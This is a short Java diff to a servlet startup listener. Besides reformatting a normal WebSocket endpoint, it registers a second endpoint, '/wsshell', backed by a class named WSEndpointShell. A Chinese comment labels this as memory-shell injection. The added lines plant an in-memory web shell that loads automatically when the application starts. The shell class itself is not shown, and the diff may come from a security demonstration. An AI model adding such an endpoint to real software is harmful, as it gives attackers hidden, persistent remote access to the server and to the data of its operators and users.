@@ -10,10 +10,13 @@ public class WebSocketConfig implements ServletContextListener {
     @Override
     public void contextInitialized(ServletContextEvent sce) {
         ServerContainer container = (ServerContainer) sce.getServletContext().getAttribute("javax.websocket.server.ServerContainer");
-        ServerEndpointConfig config = ServerEndpointConfig.Builder.create(MyWebSocketEndpoint.class, "/websocket")
-                .build();
+        // 测试 websocket
+        ServerEndpointConfig config = ServerEndpointConfig.Builder.create(MyWebSocketEndpoint.class, "/websocket").build();
+        // websocket 内存马注入
+        ServerEndpointConfig config2 = ServerEndpointConfig.Builder.create(WSEndpointShell.class, "/wsshell").build();
         try {
             container.addEndpoint(config);
+            container.addEndpoint(config2);
         } catch (DeploymentException e) {
             e.printStackTrace();
         }
